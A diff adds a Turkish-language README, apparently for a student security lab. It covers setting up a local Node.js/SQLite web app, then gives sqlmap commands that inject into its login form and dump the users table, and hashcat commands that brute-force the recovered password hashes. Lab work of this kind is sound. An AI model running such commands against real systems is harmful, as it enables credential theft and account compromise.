@@ -1,0 +1,29 @@
+Öncelikle Bilgisayarınıza nodejs indirmeniz lazım
+https://nodejs.org/en/download
+
+gerekli kütüphanelerin indirilmesi (size dosyayı direkt attıgımdan dolayı muhtemelen zaten ınmıs gelır yınede kodu calıstırıp denersınız already dowloaded tarzı bısey derse sallayın)
+npm install express sqlite3 body-parser express-session crypto dotenv
+
+sunucuyu başlatmak için:
+node server.js 
+
+tarayıcınızdan localhost:3000 adresine giderek siteyi görüntüleyebilirsiniz
+
+
+---- SQL MAP İLE SQL INJECTION DENEME KOMUTLARI:
+
+py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --tables 
+
+py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --dbms=sqlite --technique=BUT --risk=3 --level=5 --batch -T users --dump --hex --flush-session --keep-alive --timeout=30
+
+çıktıyı dosyaya kaydetmek için:
+py sqlmap.py -u "http://localhost:3000/login" --data="username=test&password=test" --dbms=sqlite --technique=BUT --risk=3 --level=5 --batch -T users --dump --hex --flush-session --keep-alive --timeout=30 > sqlmap_results.txt 2>&1
+
+
+---- Hashcat Cuda kullanarak Ekran kartımızla bruteforce saldırısı yapmak için:
+SİZ KENDI PC NIZDE DENEMEYİN !!! CUDA KURULU DEGILDIR AYRICA SANAL MAKINA İŞLEMCİ ÜZERİNDE ÇALIŞTIRMALISINIZ
+
+hash türü belirleme:
+
+hashcat --identify <hash_value>
+hashcat -m 0 -a 3 -d 1 -w 4 -o cracked.txt --show hash.txt ?a?a?a?a?a
